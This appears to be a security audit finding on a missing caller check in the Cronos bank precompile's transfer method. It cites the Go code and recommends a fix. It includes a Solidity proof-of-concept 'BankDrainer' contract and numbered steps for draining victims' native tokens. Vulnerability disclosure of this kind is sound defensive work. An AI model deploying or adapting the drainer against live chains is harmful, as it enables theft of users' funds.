### Title
Unauthorized Native Token Transfer via Missing Caller Authorization in Bank Precompile `transfer` Method - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `transfer` method of the `BankContract` precompile accepts an arbitrary `sender` address from call arguments without verifying it equals `contract.Caller()`. Any unprivileged EVM contract can therefore drain native `evm/<contractAddress>` tokens from any victim account that holds them, with no approval or authorization from the victim.

### Finding Description
The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes four methods: `mint`, `burn`, `balanceOf`, and `transfer`. For `mint` and `burn`, the denom is derived from `contract.Caller()` and the recipient/target is taken from arguments — this is by design (a contract manages its own denom supply). However, the `transfer` case diverges critically:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)   // ← taken from call arguments
    recipient := args[1].(common.Address)
    amount := args[2].(*big.Int)
    ...
    from := sdk.AccAddress(sender.Bytes())  // ← arbitrary address
    to := sdk.AccAddress(recipient.Bytes())
    ...
    denom := EVMDenom(contract.Caller())    // ← denom tied to calling contract
    ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))  // ← no consent from `from`
``` [1](#0-0) 

The `sender` (i.e., `from`) is taken from the ABI-decoded arguments, not from `contract.Caller()`. There is no check that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module accounts. [2](#0-1) 

The precompile is registered at the fixed address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract. [3](#0-2) 

The `IBankModule` interface exposes `transfer(address,address,uint256)` as a standard payable function callable from any Solidity contract. [4](#0-3) 

### Impact Explanation
**Critical — Unauthorized transfer of native `evm/<contractAddress>` assets.**

Any user who holds native cosmos-layer tokens of denom `evm/<contractAddress>` (acquired via `moveToNative`-style ERC20→native conversion, or received from another user) can have those tokens stolen by the contract at `<contractAddress>` calling `bank.transfer(victimAddress, attackerAddress, victimBalance)`. The `bankKeeper.SendCoins` call executes unconditionally, moving funds from the victim's cosmos account to the attacker's account without any approval from the victim.

### Likelihood Explanation
Any deployed EVM contract can exploit this immediately. The attacker only needs to:
1. Deploy a contract (or use an existing one they control).
2. Identify any account holding native tokens of denom `evm/<theirContractAddress>`.
3. Call `bank.transfer(victimAddress, attackerAddress, amount)` from within their contract.

No privileged access, leaked keys, or governance action is required. The `TestBank.sol` integration test demonstrates that users do hold `evm/<contractAddress>` native tokens after calling `moveToNative`. [5](#0-4) 

### Recommendation
In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the caller")
    }
    ...
```

This mirrors the authorization model used by `mint`/`burn`, where the denom is derived from `contract.Caller()` and the operation is implicitly authorized by the calling contract. [6](#0-5) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
}

// Attacker deploys this contract. Any user who holds native tokens of
// denom "evm/<address of this contract>" can be drained.
contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Attacker calls this to steal victim's evm/<address(this)> native tokens
    function steal(address victim, address attacker, uint256 amount) external {
        // sender = victim (arbitrary, not verified by precompile)
        // denom  = evm/<address(this)>  (derived from contract.Caller())
        bank.transfer(victim, attacker, amount);
        // Result: victim's native evm/<address(this)> tokens moved to attacker
        // with zero consent from victim
    }
}
```

The `BankContract.Run` dispatch for `TransferMethodName` will call `bankKeeper.SendCoins(ctx, victimAddr, attackerAddr, coins)` with no authorization check on `victimAddr`, completing the theft. [7](#0-6)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-32)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
```

**File:** x/cronos/keeper/precompiles/bank.go (L130-130)
```go
		denom := EVMDenom(contract.Caller())
```

**File:** x/cronos/keeper/precompiles/bank.go (L175-196)
```go
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
```

**File:** x/cronos/events/bindings/src/Bank.sol (L4-9)
```text
interface IBankModule {
    function mint(address,uint256) external payable returns (bool);
    function balanceOf(address,address) external view returns (uint256);
    function burn(address,uint256) external payable returns (bool);
    function transfer(address,address,uint256) external payable returns (bool);
}
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L14-17)
```text
    function moveToNative(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return bank.mint(msg.sender, amount);
    }
```
